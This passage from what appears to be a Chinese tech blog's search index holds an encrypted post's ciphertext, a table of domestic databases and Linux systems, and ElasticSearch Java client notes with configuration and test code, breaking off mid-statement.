787e754f332a13ff80139863f81bc2b3a4f5aa39753f7ee412050afadf7059e42d97fecc93f3c115660947c33ffbdff2adc60a692f53e72c9a1990c11be1cedf23115f6e5e5d96d1fdea7be15d6c9a9f83321efaa6843383d0a9ec85c478a8a062db2a94ae8a9cf8ae485f03672769e5e2800224af03e0372aca86633d93a5a9fe7b5ab583f89f5eecced86884310a3e8ce56bf9edeb2edc0665fb2f67c67c2831c49d8e61f20f16f86904641c01dcb42324ed8e27f1a75d4ae6e5592494daeea08307a463b63b5931c6c381903f755012043b4ff09c756619d9f590bb1f7317996eb6781773dce5c77805f5f461e2e7fed43d554e331b18a5408a90dc1d2c63718c2bd8cc1e3d2dbe2b6a887dea99958693f617f96fda85df8e1f263eb7c553616de16485a55b707e3d1e418fb3627b647f80f65e0a5394b38cfe5773af3069dd891c29a75b93848a927e4b08570b1d7ada1db8f022094746859bf71eb7be3337ec26c593b22ca335c0be48a04f63882016107fa854eb0b5520d615292be6e8908b8fcb22097b4bf019c647d038229a962b9905c2d7965306be1e4e204f03e2407978bbfe4aacd487eb442deffdf73c010ecf7ff9d31d00a6555923ac91e76ad52f91aa973c2f0d89f4f17b68d51942056d5407426e3aac10fb23f1c94dccf28ccbe94df0766f2f5ae65a179b138aa88e13011698b1742e269104937aa7966ea282d7ff67c57f4f1bc1284c9cd3670a874196bb66d64605d2f55ae578b41eda749e99c0ef5ecc1e39df56b0d45779877bbf341932546a86fd4a9e85ac17340ac497506ff9e9efe73d6be6d7f81b9297658789418475730b9838e97b9d3696d823d888db47c496e85f37ea413c697288df5a59e3fd897a736f42d965a71172b171805e7932b6575bc542e91416498336490bee15b32e2146923223b481b2123d0db69371bdef5a65b4bbca60509ef99d5b4b63d549ce904a7af3db981a36e55640c1a4fb76fbcd7d9d616e697de0b02498d62eb22a5b5dccc2ce531091376d0148c35fe252d8f41f6128f2949e981b5e936865d5206944e593e2768f6345c30653ae2b957b17c3e3415b696c784a00c6c8a163267adc0afefaa8281f89ce9d2c1d7a1cad595a849802e298e8d72d1374d3e85ef9a3dd5d3f70c3b24ca4be4896d280d1d83fb61e36908117744a1653e6a86db9e92143d3874e01b6acac6485d03fb7125bb0683842fe96acf9c4cc914c6b39e494771973882b7be14451224d2ef2c774b2328b227cd1fd436392a00f19bb4ad88af3034182dfb0ef041e158799bc510b9960cfa376806bd84da976bb68cca84cd2d0f0f3abc37ff49436f6f74283ca0f1b9d5582b7e8fe05ca6941f6b668dd2f292cd86cef48c64b279e95a0c50057a4fd35a825dfa62906ec8a2d3dc9703b5c731ab786807afbb09f0be14b85020e9896a6fffe15bdb6787b1610b750acb82ede01f393c898a15121905cc75e7c146199a1178f426af4c7b0f8b74cf73ed039df185eff521cf5d5078fe8c4efa406489842acb439d9901136ca3e553ce5dfdd0ab79051ee67e6719059ea6695a91d947c02739b616a55eddae67ea519797fc64d31cdb1f371f072d5dd68a26558e5ff347e2851bee44860810bf92ccfbfd3a5a6e3df579bbb4f81faaef524f15b281d25d2bd8c6fc405cbf75ee399cf00fca1ba853751b9bc4a006ec8f5a7e67ef1bb2c86b7be13981c2c488e8ce2149c10f884e18a54e805ae9b7311763c95d14ead6cf62dbeec84776d2c527e305bfb821d013c9efbfaa7db53144a34690276f66944c81ba40a404ca067565ca22c8c05fc599a35a9722e2e1974faa6e5db314d9cc1ea21f85c3bc61474fdc171d70b4daf38cde78ac635968c5640ae8f7c0ece37090a433127f4c491229e8f89df9369f5333944eba6d1b9811f8ff98a4322c9db1bd05e0cad2e9020931d1599e9ed762d1f007e4198b1e475f88a3b65c23bbfc0664d0fdbdf529e86d94c726609def7f9f894f9d4cb9d58003bc843197e88cab8ffaf1b1de319f1efffd6fdf4e7503a57615a7d19cfd1f5b5c3fc58a9212363371701795063d90b5d1d9b6ec6e3dc27b771dd300b6cb45bc57ac9472b4cdd379a869d9c8edea0152ffae0cd9d9f3f7ea18a5107be47107a7752cc8782ca2fe88c6f677a29ef63e717319297145a07e5e61be783786c064f73c6cde2f552ff325b0af4673df12695e4bbec8ae7c40c95101e9dc8e47bf9e1560e82a19be8993e537c4b74572c2c56eb5c94122c635627c3a22d943049c803c9e28a60996b36bd6e62ce0d7673f060e976276376e15d9d2fd92d6e0af068099e64799adae50f1b440f195429d650cffb6d5beb81d478e4a965a77c626a9b633dad2ae06c5b23cbb61e9c466fff2748838fd23fb3a37e43fb10d48e63a41cc5a7da3af748cd01ae6d5b0a8429e97d3dab372abfbe4a62b06e0792fa3fe61d2f516290c8e994157d8fe431851987c524a347ccd2d47b552d14b12d51a3504e7efb44f302fe3b1630bc1218eb8a9b658c89adfb52b9d158b229d63ebede3855351206816765724aed1f577d0f1af19ac21e89f6acf5df711ef80e722a4fc7762e0103b350350e8425bcaf3e9a945250ddcc2ad1c51793434bfb9258adca3aab7e8443da360c5a1ae3af93ac68aaf67c86aebe96343e1c0754e56b6b4900a68c3fb16f9dd0ca3c38780ca71806ea1504d18f563daf98181604853d4b13e42c8917f518963f8d2e960e4b5497962c6d0ceb02d2cc85679ca5ec6b133c6663fdded15251c8afa4b3d9dffdff2359e8f2c018527af5818318cdb326a7e10bac6d00a754791d2eb91f3a6727939c163de86b48b98629ff26b15f524cbc0fdb0bf38fe3f2a775fc3152466a27dde09eb385e344604d8dceb2c063c5d2a70fa3a92b82b735b8b6d0c1da83c1a5e27f36f1463317d41c564332acc58964eb240c0b4bb90670d86c5770324b8aae21489a74659a9f15e850b30be655b396d6141a47f8c4b34d184551c08f105ba600319009d197aba44a103a965f3f2de76e514d394da42959f7c9f523c4ced0e17267037444db428a35245d9a93ae0364ab11e3d46b7ffed6b3105bde0b1d36c6cb3dd23d12447b15cd24d6d5e85d6ebdcf9651a19a07a9e32218e0cf0a96630a54661491f4505c0f956fbfcfb2525f673ffc06b73d5926f6da6822a8bb713c29e91b7093b1906cbd6de0ecd596863d10e97166fc8ef7cbe96439ff72d67b3e32ac6d4902472cf079a32d75f7f88d45c59aa90edea3c8c444508ce0f06d96f47eedcf95a38f0287a882c779b0775fae1b59bc282fd9647b3e6e5b3e4f59236729ac443b2c857b13b54245e159be3d052acd8ad263a28e5d2cd0c68d1087c7e332ed890c070111352b61a35ee315491f7471b61a66e181cfcaa6381363ac5b4001b10a9fde070f92f9ad423515616ed6ef3169eb12802f8baa06328e32ca945b30dfc871a83b22a559df7d20d526fd4cddae97ade0f0036a41ea9e2487314f506efd508b2cfdf9c05f6493f06716f08d4b051b8fe8e0bd3681a0c93afa0da1c760d106c30b5515d40f9dfd5f857f178b47ac528a25bf2f56eb1116f02f23f15c9ea6a3b1fa8fa875f96e2f30d88b85e45cb19b790764f96e589d97f42985c554183d100ec6ed517959e203bc6ca182816b70bc45f050a9bb8848b68404f7aaa2f15e858403667e0cb4c4bc1586fd355ffa11cb300faad036f8d4143ce07b017378ea14ceb9069c8d362c80587efd4d4f87d76ba731a36ffaef541b85737a97e72247ae60f297dea0585f1234aec6c860382b5ee35ce97c849d426f4d978b6667063d744988ac52e02b6ad6fa0bb1b45aa56683248115db1b2d21d07269f08af3375dbac3e2734c029d9c94bf5d4c953654b8077eea2889dde308d260327bd9ee201e7721d8f1faf83fd23caae6c30b75eb19fcfbefbe0ab7bf66d4d499a3724e59cc2d68aaf6b3433db9ddb27b1f617ee2eeb349009fad9c62f2febf3820c5bfea1e955ba35463d74311333c6b0e4458bd555a673b9cc244217365db105df26d4193a93e5de5f689e4fd2bccecf18f7fe33ce274857e85958a72ef7b24460d6002e3fe954893ab9a64e7b1d42ca4e0734488ad38d5e784f35df6a934a830dec8de8bc9a42aa7564a2a199c237049621f331307c147a94946f9fb050d0bf108742a87316efd8f7770a84ab653d2d9c3a3ca5da6255ca6a15d46b6e432ce03adcf859c8a59e5b9680ebc7b93e942160acc1220256b400bd650343c06248d7098d807eac6a95e2bdb869d2e5b256eb19f52865fc4b3423c642f5bb09f11a2b817a5251527923d53167fd3f601b1143bd418e786fb85bcd61f2b4d4747b629f47c34dd3e88fd5519d7bb3f59619a3885f2e51deb2374b09b6288a5915b3e5e103627dc3da85f1291aabdfbbd3e187cf281bb33f638afe1a5d86f32036bf0eb587c38c98db5a57cf75ed97028591057dc02313ab2121668f12ac6898a8a201f30b5473732629fe5cbc8088ee793ecbd37ddd02cba389d9090aec9ef69894f445c8581d62d87af9b0a460f1690a09af3d45c2092f7489a3766644a21b640cb1bfd0821493591d71541c923b1847256f5f5f0c1620c90f0802bb306c7989d73d3ef38edf1deb868c3a09c007e4524cc920062f0cf208a8ea09c16256a1c8a233eb861cb11ada7b1758afdae280fc464e788958545f486d9ad2e21fa586867fbbb57350ba5075e291ef9474cb5f7a909bd4070739dfa906c36cef0e4a70117c599a806d0461068efe8d9022e17d71f61f69f454a45a3f385094ba6432939f01f90c4986ee91adc0489c7be3b3b14879bbfc01247cae92cce141d24943a3ed05efe23bc206a150a58bb60e7aef5000b1aa93f0154860b44effb6f2982e0f72576f917eed2754f8eb689db673b5a3f527183e0bfe2a55344b98713aa6ed34c229f6b7277d45d18f391551347e6309a4d3591687bc5c00a24f4b4e54deb7b2113eb32376ce387e4955846e3d5e2f336196a09e0295c7192481437701a6690d3243f40ca5799a82c3e41fbdea2aafd2748842fdb5fbff535c132650193457eee7c58557a0d38cac303eb21323e46d947f3f314869f865c621ac28b312b8524427879d3241562f963b69e29a9cecb7d66b3371698f2fa5f006a88d77d06e9e4869ddaa10d6dac164bcac223283940141ca4587648bbdfb6e0da731244eccbc3f312454a92ee9f4bd1a230373a37117259930ddc91b6986fbc8fbf4aefa24eccb0a8e5544a06cfa31e5f2b029b511b11c66eec78e6a9e9b696c115efa57b27da0c1ed66e70fabd33ec9b7302461073ddaef5085adb3cf4bdb3579433060c9d18d94decbf662756808e7123a87b5f3559269531860269027cb507cdfc01d2596756c47805547f2422816acbac9bb0ce77affce5dd925b0e2a84f699d5bd4d3e56684188b247194d2e5d9fd5030da15cb707342b7265f573f0c4c910110d5f1b7feafdd8811f1baef8645ef9869da3e1c92c2f6548a73ad3b1d9c593c7fee4554c60ce5d5da9b69b80adf5faa5b637ed68a3f28a7da61e5fb0ad7c18034b27b506cb506f2aabe14de693997780b971c58add0f560e8176d28e648a9b9a06b0b198cd40236037c6c60f696a8a7a62516c8fd2d730139f01aca1b567202b685fce47199dc057b7656a6727cd0095c3f64d307dd8a89479e69d8b221811941f14db7636e2e78e733ddcecc4211b5efdbde5ab321477f492a4710b652cf67e00dd1611e7692048c62ebabcbbbc8428f18a3ca74644abed1539cbd1845b43d8d12fdb66f023924db713451af627199eb60c2b1ab7fd1cdc882d66cf8893cd96a31a5f6737c45292f4c12a81534ebaac6efb635cb4ff9ee0bcdbcbfb4576483cc9e72ce45401212253ceff1ab47225aad01e04b61eb5630d181dc99ca106d1f457a2ee4a36804817616409fef98fd008a5d12cd73843171385d685d3d09d3836e55c871e1e790e26b13cbc7953c027e9788ecc3265ec4f8638fc7addae911bf71c586bd97b187639c447d078beeef180bdc2740833cea11adebc3d550c85c75f016bf24dbc5ac1520774fead9b3463ccb95494469596a5d0caef9b6f7c2d36910e50385236fb7d4fcdd168519599197bf29391454af93c53ee98f216ea8c2ee3e6511a1a64b1043279e11c913c84759aa2cf4b94aac37d535b7f0ef5bc9c054330eea63b543cf46e16e91f87255624a137adfdd7bd934dea4a45791c7d4b6f60a9bb6d802a31a38c74d8c7cb236062670c0b0d130f57f8c02f5c7b1ebe4cf1606dc89e8c82db074d249dd80b475b8ff2116a0c25f39bf9c7d977196b967e44b7373a194b0e9bd93ce7599daa3d937c8e833772d980b5a74eb6ed0c3a0658606c955f2ea3c72e64d902048a0c0bf182306c2e5373e3fd1bf05e1136c30098e2709a31ed7b6efa03f4d770a0450773ff0ebf1e4e44f1db9d31856e572abf0480767b3f9c5d554b5e2eecc5e5547e20f47c4a645178d2673d584d6819969897d7ed1fcdca08565fa93e98be0270456f4655a71716197ace7b61dd67fd2c6f003138d79d61b9e490afcc9ee01944102bd703646d98c3414a094bcd34bc31161607cd023ae66c3d94c6dd9a1d053975f11b28e067896faff362d2d437c49e3225e86ce773330209af2c3a8097173c388cca5ed0bad1c30a2506bf3eeebaa88d70b8eec738c2ebaf5a5c4fb9b4b066bd9375427e1bf411e646d0ea386a9b054c9c1cb1c1971c867369b790a0b87cec2b30bcfe2d306c455bcda173f5b6e8d3aa7e44878547dd36f23904a6f1bfe1de3aaf2a4b34b8182460514ba8dcae9c879d03e6bc2c506d467712404a13df9aa6a452010cbde5ffff23f6d34f942668053219a5bc878bdbe669c02a5fb6acb095337fe3747d414ac26ed8114aab818b966c58605ca9b85232279d4fa8464491c876f761f3fcfaf2401c7f5700046856bf1ec3f2e20a1983a7a2f1187d2505c5a2592dc18399ae2099061cc7a927f8a9dde9dc7482e2d4f3b7a93fd5636d7ac62ce082792d67aa9dfb44bf9eadc6b002cc3ce9aa2c8b2aa5145bb22ef2341d5e73ac21fa9fa5ce3784d28610a63fffbb81d3262844f8b7a5366f0007941734dd5eaa55e8a770566f9fa7893fcca46fe77a13744f9b108d6ed35ef55d115777abb982a683395322354bffe97fac9010e79058ca66abe3e82c5293deb103a0617a4c79d5e8317f826eb9361875f118fa39603de562bfb080a9d60482fad8d24c9f25653da2f067f0695d46de1f788a863e2c04fdea03c50fcffb91bd39f4cc045334d8209a69d8bfd613d42ce1fdf3b97842be11ef753a856fa13d42be40624124e64ea7dae5c26a1dfe295c7eff6ebfdebb2ce98317b090c13599d871b37a802c497e70657ea40340d0643025761836185bf9fed28f24f057842f8f8563ce2cf2a28246999cc65d8a1246af58879d420e39b1a121246c96044d00b620d6977346f1d121dd4cd4a3291cf29b1fcfb54f5733ae76d4bde2480179e1ed0330a4a977b59a1edbe348aa9bc11e804d4d89dac453743b6477d643331c1853ae3b13cd043e73e1e22ec01846a386fff9338e497b9e45fce959b8accdced2e276cb96b51410f543f2f632d2f329c53356dfa447a406c916c6052755590676b2490ff04b08878c74637d1f89eadc2ad461ec291c1256111562af0b173cc29644b2a641a0c2b553164fb52f65043473ca80a7d02cf254b675cb6f3e215dad1bec80d70700c210666f639de4f7f019fc861dea252c2a8fe2ad539ac54d903b2e7249e8d268778a65e1d917bed81494a402129c74e09cfeefc575cac826cc67edc98474d1399f697594a32b94afbebe982afc2163507ba026634d7615b11dc10548e9c79cfe6fc0d5425ff04b608ca00b43ed088559c81a1702935988b131ce5ea368abb9abe35f80c74e6b544b946f629481cbd8703dc72ecba10d7b7a09ec76b5c43e4008974ea5b371c547423b31a5905bde37945829d10b7356aedc536769df34346d41da082d1236081bbe1082c989615ddfd8a6d309356960d6455642e2c9e6a776ffffd2fdb05430b9e2bd8109b5390b49c24a3421ee02109e7dfb4ef4d15b8ff93da731b86825a06e22c920c8efadbca7ac05cb25720dce3c10b6b0befa6cd4af82020a6c7533d9ffd4027d3e31f0c38491394a6abeadc6e9e81b48bda8a00781bd47cec0aa04ccbf77c860cc97a00159a919d9868cc03367555666fbc1338e4ee37af9d744fb914ff4a633103c32ebf0f6455eb047c717d91addd158624ff7896d292659e8275f65fe0145e1c5550a1d4223ac28640728781ab40a99cef57a0b5f7222effb613113a7f8ecbd0ddc57a0c6c4908204e14963ec0103c766ed089af83bfc00fe6a23e2faeba2587bf68caa879e8452daa3ebc5fa234bf907c6b57855095be10fe07abdd2b2ae29a1259304c2d2f3253e5d5681f286bee8d3c901506f129828034559121005610465327f3663daaf8da8fefdb0180fb6a517aa8850211d42fd2275eff41764a887aceb8dcfa931c3dc4ffc427d2597ffbd6abc64cc4a602e5f3cbe3eae2a35ff194f1a03c8e32e9e3282f3b2c4d6b83a9a4a38e49ee8f3e20c1f7a263a2bb14d140b703ec18ba852c355d0c3ae8bb21134d588df3d5b885329d801b0900fbca7c709b2bf72df5ec562c8d97e5e7a29b5ac6461f4e7654d40c13ae523768c757f031c749310e5ce4d015f96e706fa718bbccadf71008058c03fa22ce29b0ad82e6abe3f3780d8280b6f74ac1bf574511bd021dca43dd5707df2c7256c3c80648dc31edceb6c67b31572cbeacb8589277be57194ef01ce9dab233ff3c242d6fa1af91198942fdbc1791aaa4cea4ec0c1b71670ed9dd8121d8f2074861e140179ea1a70f654e942a2cb4c5eecd9ade08c8a8f19c786507df895959fc1f5b2433bff0e5729f113e2bcee83cba6629b6784ca5009e049cd875188b78854d5f802d615774b4d2f8cd048724d18c25fdfdd5b7014585532a58899e587bf87e15f36639c7768a1f35f4ff089588627534209919b61696d9421f8d341579c7ec82558b0c2435d554797d934ded3d877acb648a41bbd78d593ee8c7323058d82bdf1d778091e56e24034a6467a5c53b7bfcf97c33830f2373fccc93992309d7eb02491048bc200a105ed83138b2f2b05adb23e3b622affa5d4cb8b42c1fe7132c735c89a1a448a4d90204692c8f5a6dbfc9b74ca82ac3879828c9cf2fa8edadb297da33bcd07c56a514bc56006f3e053646f061e90d153d10eebc0d495ca3194d383a38a099ab3e18a810c0de31200a2bbbd67af88cbb4068a04c17a057a3e80ae00bf63e8cad7d75405feac4852e28fd538624346dfc7da300c18a1f927cc956c5f5c1b4c4de88ef1a0a5ec6b0f3cbb4adaef353e1cf736a00ee810f15fc3e123d229c2ac3a8899b223c09e1de3402b6c2d7466e2e48a7f9666956b42c036c6b679824094afabaa49baeb432c0f5013a76b671456f1cada969f582696f5d163b0e84d719c01db921bb76080f9b09d1bb75379abfbcf6567f50d12b636251a72f39b73027019e18c92130efd8830f99eb4207d153ee5e2e38f66d54a441268cb50b10908587212115548cb96ca9879055b27c950597ec76f41d2ffeb81a530901e84e487543f04cd1e09edd202dea3fbece22b8f427731331f861cc101320f252c9851944e2d5cdf04c0ac0a24f06fb6e022680e4310661c26420936fad402f26089f3e29bc84cc3aaaed48f7331d1a472c653d5e14333d9dd041c8acb59ab99a048d84a1f3b2d48309ff9aec15b35c1d4ea14f18e9eaa2b8d1ae4203c79f4c3232b6179a0ab004d14a13fb0d7d0322f65703e114f0f32d630334f9aff3ea7bc6a77de7ea09f44e7cf25b4281cb7b308990c6dfff20084b03211ec079c28c23b18382a63743f0a3c73659accc11555f9d69f78c8c129ad99c329309fbfa78df80d32690a3f0f98ba66cfc3a20e064aea02e38041bc5ec4a9728bf4f7a1f8a1a1c4fb84bfc2bc3ac80db35ae0c7c573fef45568c7526241df8e5fc53e0e88521109620a7fdd487cffdcbf93b42f766020cdcbb09a8da7d8dc1165d2cee091362db71557cf7906640001f1e5739e49b5e4bfbe09ff2a99f27dac9c5824ed58233dde0dab6436ad9ab5600ed122b86e078c726938a14ab7fbd8fa2196b7ebf5a122b3e8e1d8b7158ba2a281137d95928e1113760722ac1b6f46c635254e2a1dec41a0c73a7325da8e68eaabbd66f8b7f5287a17db0af75b767309812121985cfe0c685da67163d8cee27f647a9548d6070876ca5dd3f19bce369276894dd1b1d57303f7c514777b52192c7a58fbd3e8c91f7f14eaa17a2c4fa2f7f66345c1aa46fa67f8854c01389a59fdbfcc4c0a09575d6b6c62b611a9315191765614c4e100b48bc376d6dd7113aa69938879d7dc9e79f4be910287ec961cf398614b3403bb69bd32dedbb98ada27a0ff29cba41d626fb1e8d2f62ec8434dcbba4d23edf3b9951e651d2890141f193b25568109d06b15620eaa2eaf0883c500775ab52ae7223d2810b8295be44192c69d0643281b320f2156beb5e6a8a7756813049c3a69af3cc18d800d4055d571119c5eba0d0e694b6911e9cdde116a2feccef91f9ea3f59b0b8cc4408bbcb36730c7d0cc262aa586dfee437261d99ef314da5c731e2f2c1d82dcec89273abab15003b32f5206c9d9b7d7feebab07ddd44c91e918a8e9825214317e1064284410cd74dd9d0e9dbcb2fd4806a8fd5bef7807d4562d669446bc033717a2c3a453fab74838e91a79fa875ccad8a50ae5cb6b530c8ff0528ceb69f9c4bc8f8e1a495094615f644f4611c70a10084d9d33f977473937ed9552997ce3d5e5bd983fd248100e9e1eb1d582c72b0113d434a2bdc17be0914b692961975ff0c88b9a8488b023bf67976a7808c4a07b5db3a5ea0f01d00c1636a0463f014de61723d8deff2df1733139a3b35932d4b5ef19ffa50dfba77e4a2db24822fc703e6a1e17a5badb9883cc5891d307a830d2654565e7dd84643c732d179f98baca0021902b7938235e51b8bb707a5960f0d94b8c77551209a9bd1e9ec195453e2380a5e97f0ba7a3ae3912a18a27c2f53e0924923de7741564d03118b088ee8a3120dbaada8a60c607c9fae4758d81d10b99ec7e0115aad30bda28c025427cfcc63bcc659956f52c6287f2dcea83bcd7c9220d2f6f6f4ce9d4fecbfe0763ba11fc17ee77354dbd8ff2b8fd9a1e62476c159034bb30245c4488eb982f117081c9c72dcc24180633ce5ba897a27ae9edde85afeb1c19682fe76c57cd0f5746d971a2cf1cb949ea09f6185ce72690a073ae9fb790d3f22aa095c512064aed88cb161a2075fc7a37b8589ac725f049135b56dfe82756ab91f114bc00ca19f9dacadce80da17715721f21cc2268a5c87c3eeef4d13614445997bbe6478407ed1458f71726d1bfbf12487f6fca4f2bd015b3f3a2fe6fee9ce2867e6fcdfade8326fe737abe73c33c8c50f741c1c30932462abaf40d10b554c9d893548b5c228bbd1fe2e513cb23a01fb0147d1708f672d176c37e981245b46eef269ce427d1dfe08b62d578aafd3e98bafca40744d0ef8fe8c3c76a3fa90ce166454714371a69f514a18e1e1d2f13e3101d977ad1c5b62069395d798f7e222ad398c28a7ae0fb18a66a7e0affe9c6988adaed00341354e9cb5bb94477716513d1342526ec1bb303735aa16156f49482b8e73b56d8e03ab012423e9c253319caffdce69d810f7867f8f1e5a1f26849cde5971b213c50bfade032f8aceb983f9404aceea275cf8291c5a17437330b1165bb1eaa27b96c57e21cfa465a72676396ebd8786671b5c2307b4c288ebd5f7f696f34e2eb10235472942e3bb6034b9595e869db77f3772e046f2e7758752492e0fe98f97d3d776c631cb40a0680c45df7c426c7ba3a19940d6ae172463f5f1ab48c768f2681b3ec70bdbb6302a2319663367689d085b60084117941c859a40380589c70599c7b841769deac208a2c9211d596c8d6f5c0d8a09ed22bcf6182207346ce0d17ad99a3c5291f91cb026aaa7126be7f6feebe2a3bd0f27240ec13734bac8c38ef07760c30742efe76ca92dd64bdd777bdd2f38ab9cb56d25c23b32508ff20cbbdb0acfded6f77f2a4b0876d4760325542048a74a9791beacc16279cf286290f829c912bcc7fde968909a8ec7f0b04635ff81caea8d033e7293efe0de50737a7bee734e8995db9faefe0a4a53d91f9bf370e3f01f8417affc9134b9aa0bc178fb64dfc76a7c28f0c94ef974dc0dd74efea93a90481024760a62a6c172bbda128bb37e933d4d16cc2c1a9f909552500aab24538b2bb1d8107e57526f56a4afb7641c7b983fe551fa0de92559d2bc3e8d526e9b7c55c1203054c780a6580fa9f7a06bdcc6f5474873851cc84c40edcc1f201b51057f5fea7900a5b3e1ca80ca9b2e50d2c9 请 输 入 阅 读 密 码.",tags:"加密博客"},{title:"国产互联网产品汇总",url:"/posts/3ccf5667.html",text:'国内数据库云厂商数据库 数据库 云厂商 TDSQL 腾讯云 GaussDB 华为云 AnalyticDB 阿里云 国产商用数据库 数据库 公司 武汉达梦 - 人大金仓 - 神州通用 - GBase 南大通用 PolarDB 阿里云 国产开源数据库 数据库 公司 TiDB PingCAP openGauss 华为 OceanBase 阿里 国产 Linux 系统 Linux 系统 公司 HarmonyOs 华为 统信 UOS - 银河麒麟 - openEuler 华为 Deepin - 优麒麟 - table { width: fit-content; border-collapse: unset; } th, td { padding-left: 30px; padding-right: 30px; font-weight: normal; border-bottom: 1px solid #ddd; } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"数据库"},{title:"ElasticSearch 开发随笔",url:"/posts/26ba10c4.html",text:'ElasticSearch 客户端选择第一种基于 TCP 协议（ES 的 9300 端口，用于集群通信），依赖 spring-data-elasticsearch:transport-api.jar，此方式的缺点如下： SpringBoot 版本不同， 依赖的 transport-api.jar 版本也就不同，不能适配不同版本的 ES 从 ES 7.x 版本开始，官方已经不建议使用 9300 端口来操作，而且 ES 8.x 以后就要移除该操作方式 第二种基于 HTTP 协议（ES 的 9200 端口，用于 RESTful API），可选的客户端如下： RestTemplate、HttpClient、OkHttp：直接发送 HTTP 请求，ES 的很多操作需要自己封装，使用起来比较麻烦 Elasticsearch-Rest-Client：官方的 Rest 客户端，分为 Java Low Level REST Client 和 Java High Level REST Client，API 层次分明，上手简单 客户端对比 客户端 优点 缺点 说明 Java Low Level Rest Client 与 ES 版本之间没有关系，适用于作为所有版本 ES 的客户端 可以看做是低级的 HTTP 客户端，没有封装过多的 ES 操作 Java High Level Rest Client 使用最多 使用时必须与 ES 版本保持一致 基于 Low Level Rest Client，但在 ES 7.15.0 版本之后被弃用 TransportClient 使用 Transport 端口 (9300) 进行通信，能够使用 ES 集群中的一些特性，性能最好 JAR 包版本必须与 ES 集群版本一致，ES 集群升级，客户端也要跟着升级到相同版本 已过时，官方从 ES 7 版本开始不建议使用，ES 8 版本之后被移除 Elasticsearch Java API Client 最新的 ES 客户端 文档较少 提示 关于更多的 Elasticsearch 客户端说明，建议阅读 官方文档。 ElasticSearch 客户端使用案例下面将简单介绍 SpringBoot 项目如何引入 Java High Level Rest Client，由于 SpringBoot Starter 默认依赖了某版本的 Elasticsearch，因此需要在 pom.xml 配置文件中使用 &lt;elasticsearch.version&gt; 来指定（覆盖） Elasticsearch 的实际版本号，否则会出现兼容性问题。 引入 Maven 坐标123456789101112131415161718&lt;properties&gt; &lt;elasticsearch.version&gt;7.4.2&lt;/elasticsearch.version&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.3&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt; &lt;artifactId&gt;elasticsearch-rest-high-level-client&lt;/artifactId&gt; &lt;version&gt;${elasticsearch.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; Java 配置类123456789101112131415161718192021222324252627282930313233343536import org.apache.http.HttpHost;import org.elasticsearch.client.RequestOptions;import org.elasticsearch.client.RestClient;import org.elasticsearch.client.RestClientBuilder;import org.elasticsearch.client.RestHighLevelClient;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class ElasticSearchConfig { public static final RequestOptions COMMON_OPTIONS; static { // 基础配置信息 String token = ""; RequestOptions.Builder builder = RequestOptions.DEFAULT.toBuilder(); // builder.addHeader("Authorization", "Bearer " + token); // builder.setHttpAsyncResponseConsumerFactory( // new HttpAsyncResponseConsumerFactory.HeapBufferedResponseConsumerFactory(30 * 1024 * 1024 * 1024)); COMMON_OPTIONS = builder.build(); } /** * 定义 ES 客户端 * * @return ES 客户端 */ @Bean public RestHighLevelClient restHighLevelClient() { // 指定ES的连接地址 RestClientBuilder builder = RestClient.builder(new HttpHost("127.0.0.1", 9200, "http")); return new RestHighLevelClient(builder); } } Java 测试代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889import com.alibaba.fastjson2.JSON;import com.clay.gulimall.search.config.ElasticSearchConfig;import lombok.extern.slf4j.Slf4j;import org.elasticsearch.action.index.IndexRequest;import org.elasticsearch.action.index.IndexResponse;import org.elasticsearch.action.search.SearchRequest;import org.elasticsearch.action.search.SearchResponse;import org.elasticsearch.client.RestHighLevelClient;import org.elasticsearch.index.query.QueryBuilders;import org.elasticsearch.search.SearchHit;import org.elasticsearch.search.SearchHits;import org.elasticsearch.search.aggregations.AggregationBuilders;import org.elasticsearch.search.aggregations.Aggregations;import org.elasticsearch.search.aggregations.bucket.terms.Terms;import org.elasticsearch.search.aggregations.bucket.terms.TermsAggregationBuilder;import org.elasticsearch.search.aggregations.metrics.Avg;import org.elasticsearch.search.aggregations.metrics.AvgAggregationBuilder;import org.elasticsearch.search.builder.SearchSourceBuilder;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import java.util.Date;@Slf4j@SpringBootTestpublic class ElasticSearchApiTest { @Autowired private RestHighLevelClient esClient; /** * 创建索引数据 */ @Test public void indexData() throws Exception { IndexRequest request = new IndexRequest("posts").id("1") .source("user", "Jim", "postDate", new Date(), "message", "trying out ElasticSearch"); IndexResponse indexResponse = esClient.index(request, ElasticSearchConfig.COMMON_OPTIONS); log.info(JSON.toJSONString(indexResponse)); } /** * 聚合查询 * &lt;p&gt; 查询 address 中包含 mill 的所有人的年龄分布以及平均薪资 */ @Test public void searchData() throws Exception { SearchRequest searchRequest = new SearchRequest(); // 指定索引 searchRequest.indices("bank"); // 检索条件 SearchSourceBuilder searchSourceBuilder = new SearchSourceBuilder(); searchSourceBuilder.query(QueryBuilders.matchQuery("address", "mill")); // 按照年龄的分布进行聚合 TermsAggregationBuilder ageAgg = AggregationBuilders.terms("group_by_age").field("age").size(100); searchSourceBuilder.aggregation(ageAgg); // 计算所有人的平均薪资 AvgAggregationBuilder avgBalance = AggregationBuilders.avg("avgBalance").field("balance"); searchSourceBuilder.aggregation(avgBalance); // 执行检索 searchRequest.source(searchSourceBuilder); SearchResponse searchResponse = esClient.search(searchRequest, 